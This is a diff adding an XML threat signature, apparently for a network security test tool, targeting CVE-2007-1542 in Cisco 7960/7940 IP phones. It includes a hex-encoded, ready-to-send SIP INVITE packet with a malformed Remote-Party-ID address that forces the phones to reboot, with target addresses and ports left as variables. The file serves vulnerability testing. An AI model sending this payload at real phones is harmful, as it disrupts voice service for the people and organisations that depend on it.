@@ -1,0 +1,75 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Cisco IP Phone SIP INVITE Message Denial of Service"/>
+    <EngDesc display="true" value="There exists a Denial of Service vulnerability in Cisco's IP Phone models 7960 and 7940. The affected firmware cannot handle a specially crafted SIP INVITE message with an invalid IP address, causing the phone to reboot upon receiving the message. As a result, a remote user can cause a denial of service condition to IP phone service. Upon triggering this vulnerability by a specially crafted SIP packet, the Cisco device running the SIP firmware will be forced to reload. The Cisco device will be unavailable for the several minutes it takes to reload. Repeated attacks could create a continuous denial of service condition."/>
+    <Intent display="true">
+      <item value="Denial_of_Service/Integer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="SIP"/>
+    <Type_Of_Equipment display="true">
+      <item value="VoIP_Equipment"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Cisco"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Cisco_IP_Phone"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Cisco_IP_Phone_7960/7940_P0S3-07-4-00"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2007-1542"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="565713d863f29cf700f59aa1868822fe"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="VoIP"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633997530018666568"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1264156201" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="SIPdestPort" type="ImperfectControls.Port" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="SIPsourcePort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="B"/>
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:0C:29:E6:36:70" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0114" Identification="548A" FragmentOffset="0000" TTL="80" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="false" MF="false">
+        <UDP srcPort="$SIPsourcePort" destPort="$SIPdestPort" checksum="" length="0100" Payload="494E56495445207369703A333430314031302E31302E31302E33205349502F322E300D0A5669613A205349502F322E302F55445031302E31302E31302E323B6272616E63683D616161616161610D0A46726F6D3A207369703A616161616161616161614031302E31302E31302E323B7461673D61616161610D0A546F3A203C7369703A333430314031302E31302E31302E333B757365723D69703E0D0A43616C6C2D49443A206161616161616161614031302E31302E31302E310D0A435365713A2039323120494E564954450D0A52656D6F74652D50617274792D49443A20637369703A373936302D314031302E31302ED12E330D0A0D0A"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
